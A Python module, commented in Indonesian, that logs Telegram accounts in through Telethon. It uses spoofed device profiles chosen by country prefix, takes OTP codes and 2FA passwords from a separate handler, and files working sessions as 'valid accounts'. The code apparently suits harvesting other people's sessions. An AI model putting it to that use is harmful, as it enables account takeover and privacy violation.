# login_handler2.py
import asyncio
import os
import json
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError
from telethon.sessions import StringSession
from telethon.tl.types import User # Untuk mengakses informasi pengguna di sesi
# Mengimpor dari config.py
from config import api_id, api_hash, SESSIONS_FOLDER, SESSIONS_FOLDER_FINAL, DEFAULT_DEVICE_PROFILES, ALLOWED_PREFIXES

# Dictionary untuk melacak sesi yang sedang menunggu OTP
_pending_sessions = {}

def get_pending():
    return _pending_sessions.keys()

def get_device_info_from_session_file(phone_number):
    """
    Mencoba membaca file sesi Telethon yang sudah ada dan mengekstrak info perangkat.
    Mengembalikan dict info perangkat atau None jika tidak ditemukan.
    """
    session_path = os.path.join(SESSIONS_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        session_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone_number}.session")
        if not os.path.exists(session_path):
            print(f"[ℹ️] Tidak ada file sesi ditemukan untuk {phone_number}.")
            return None

    try:
        # Client sementara untuk membaca sesi, tidak perlu connect
        client_temp = TelegramClient(session_path, api_id, api_hash)

        
        device_info = {}
        if hasattr(client_temp.session, 'device_model') and client_temp.session.device_model:
            device_info['device_model'] = client_temp.session.device_model
        if hasattr(client_temp.session, 'system_version') and client_temp.session.system_version:
            device_info['system_version'] = client_temp.session.system_version
        if hasattr(client_temp.session, 'app_version') and client_temp.session.app_version:
            device_info['app_version'] = client_temp.session.app_version
        if hasattr(client_temp.session, 'lang_code') and client_temp.session.lang_code:
            device_info['lang_code'] = client_temp.session.lang_code
        if hasattr(client_temp.session, 'system_lang_code') and client_temp.session.system_lang_code:
            device_info['system_lang_code'] = client_temp.session.system_lang_code
            
        if device_info:
            print(f"[✅] Info perangkat ditemukan dari sesi lama untuk {phone_number}: {device_info.get('device_model')}")
            return device_info
        
    except Exception as e:
        print(f"[❌] Gagal membaca info perangkat dari sesi {phone_number}: {e}")
        # Mungkin file sesi rusak atau format lama
    
    return None

def get_default_device_profile_by_phone_code(phone_number):
    """
    Mengembalikan profil perangkat default berdasarkan phone code dari nomor telepon.
    """
    for prefix in ALLOWED_PREFIXES:
        if phone_number.startswith(prefix):
            return DEFAULT_DEVICE_PROFILES.get(prefix, DEFAULT_DEVICE_PROFILES["default"])
    return DEFAULT_DEVICE_PROFILES["default"] # Fallback jika prefix tidak cocok


async def request_otp(phone_number, current_device_profile=None):
    """
    Meminta OTP untuk nomor telepon yang diberikan.
    current_device_profile: dict berisi info spoofing device.
    """
    if phone_number in _pending_sessions:
        print(f"[⏳] OTP sudah diminta atau sedang dalam proses untuk {phone_number}.")
        return

    session_name = os.path.join(SESSIONS_FOLDER, phone_number)
    
    # Inisialisasi client dengan atau tanpa device_info
    client = TelegramClient(
        session_name,
        api_id,
        api_hash,
        device_model=current_device_profile.get('device_model'),
        system_version=current_device_profile.get('system_version'),
        app_version=current_device_profile.get('app_version'),
        lang_code=current_device_profile.get('lang_code', 'en'),
        system_lang_code=current_device_profile.get('system_lang_code', 'en')
    )
    
    _pending_sessions[phone_number] = client # Simpan client di sini

    try:
        print(f"[⚙️] Menghubungkan client untuk {phone_number}...")
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"[📨] Mengirim permintaan kode untuk {phone_number}...")
            await client.send_code_request(phone_number)
            print(f"[✅] Permintaan kode terkirim untuk {phone_number}.")
        else:
            print(f"[✅] Sesi untuk {phone_number} sudah valid, tidak perlu meminta OTP.")
            # Pindahkan sesi yang sudah valid ke folder final
            await client.disconnect() 
            original_session_path = f"{session_name}.session"
            final_session_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone_number}.session")
            if os.path.exists(original_session_path):
                os.replace(original_session_path, final_session_path)
                print(f"[📂] Sesi valid {phone_number}.session dipindahkan ke {SESSIONS_FOLDER_FINAL}")
            if phone_number in _pending_sessions:
                del _pending_sessions[phone_number]
            # Log juga sebagai akun valid
            log_callback = globals().get('log_valid_account') # Ambil dari global scope main.py
            if log_callback:
                log_callback(phone_number)

    except FloodWaitError as e:
        print(f"[❌] Flood wait error untuk {phone_number}: Tunggu {e.seconds} detik.")
        # Jangan hapus dari _pending_sessions, biarkan client tetap ada untuk di-retry nanti
        # Anda mungkin ingin menambahkan logika retry atau timeout
        await client.disconnect() # Putuskan koneksi sementara
        if phone_number in _pending_sessions:
            del _pending_sessions[phone_number] # Hapus dari pending jika gagal

    except PhoneNumberInvalidError:
        print(f"[❌] Nomor telepon {phone_number} tidak valid.")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{session_name}.session"):
                os.remove(f"{session_name}.session") # Hapus sesi yang tidak valid
            del _pending_sessions[phone_number]
    except Exception as e:
        print(f"[❌] Error saat meminta OTP untuk {phone_number}: {e}")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{session_name}.session"):
                os.remove(f"{session_name}.session") # Hapus sesi jika ada error
            del _pending_sessions[phone_number]


async def complete_login(phone_number, otp_code, log_callback):
    client = _pending_sessions.get(phone_number)
    if not client:
        print(f"[❌] Tidak ada sesi aktif untuk {phone_number} saat mencoba login dengan OTP.")
        return

    try:
        print(f"[⚙️] Mencoba login dengan OTP untuk {phone_number}...")
        await client.sign_in(phone=phone_number, code=otp_code)
        
        if await client.is_user_authorized():
            print(f"[✅] Login berhasil untuk {phone_number} (dengan OTP).")
            log_callback(phone_number)
            await client.disconnect()
            original_session_path = f"{client.session.filename}"
            final_session_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone_number}.session")
            if os.path.exists(original_session_path):
                os.replace(original_session_path, final_session_path)
                print(f"[📂] Sesi login {phone_number}.session dipindahkan ke {SESSIONS_FOLDER_FINAL}")
            if phone_number in _pending_sessions:
                del _pending_sessions[phone_number]
        else:
            print(f"[❌] Login gagal untuk {phone_number} (OTP mungkin salah atau butuh 2FA).")
            # Telethon akan otomatis melempar SessionPasswordNeededError jika itu kasusnya
            # Jika tidak, ini berarti OTP salah atau ada masalah lain
            # Jangan disconnect atau hapus client di sini, biarkan handler memutuskan
            pass # Biarkan exception SessionPasswordNeededError yang ditangkap di handler

    except SessionPasswordNeededError:
        print(f"[⚠️] Nomor {phone_number} membutuhkan password 2FA.")
        raise # Lempar lagi agar handler bisa menangkap dan mengubah state
    except (FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
        print(f"[❌] Error login OTP untuk {phone_number}: {e}")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{client.session.filename}"):
                os.remove(f"{client.session.filename}")
            del _pending_sessions[phone_number]
    except Exception as e:
        print(f"[❌] Error tidak terduga saat melengkapi login OTP untuk {phone_number}: {e}")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{client.session.filename}"):
                os.remove(f"{client.session.filename}")
            del _pending_sessions[phone_number]


async def complete_login_with_password(phone_number, otp_code, password, log_callback):
    client = _pending_sessions.get(phone_number)
    if not client:
        print(f"[❌] Tidak ada sesi aktif untuk {phone_number} saat mencoba login dengan password 2FA.")
        return

    try:
        print(f"[⚙️] Mencoba login dengan password 2FA untuk {phone_number}...")
        # Penting: Saat sign_in dengan password, Anda mungkin tidak perlu OTP lagi
        # jika itu adalah bagian dari proses SessionPasswordNeededError
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            print(f"[✅] Login berhasil untuk {phone_number} (dengan 2FA).")
            log_callback(phone_number)
            await client.disconnect()
            original_session_path = f"{client.session.filename}"
            final_session_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone_number}.session")
            if os.path.exists(original_session_path):
                os.replace(original_session_path, final_session_path)
                print(f"[📂] Sesi login 2FA {phone_number}.session dipindahkan ke {SESSIONS_FOLDER_FINAL}")
            if phone_number in _pending_sessions:
                del _pending_sessions[phone_number]
        else:
            print(f"[❌] Login gagal untuk {phone_number} (password 2FA salah).")
            await client.disconnect()
            if os.path.exists(f"{client.session.filename}"):
                os.remove(f"{client.session.filename}")
            if phone_number in _pending_sessions:
                del _pending_sessions[phone_number]

    except (FloodWaitError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
        print(f"[❌] Error login 2FA untuk {phone_number}: {e}")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{client.session.filename}"):
                os.remove(f"{client.session.filename}")
            del _pending_sessions[phone_number]
    except Exception as e:
        print(f"[❌] Error tidak terduga saat melengkapi login 2FA untuk {phone_number}: {e}")
        if phone_number in _pending_sessions:
            await client.disconnect()
            if os.path.exists(f"{client.session.filename}"):
                os.remove(f"{client.session.filename}")
            del _pending_sessions[phone_number]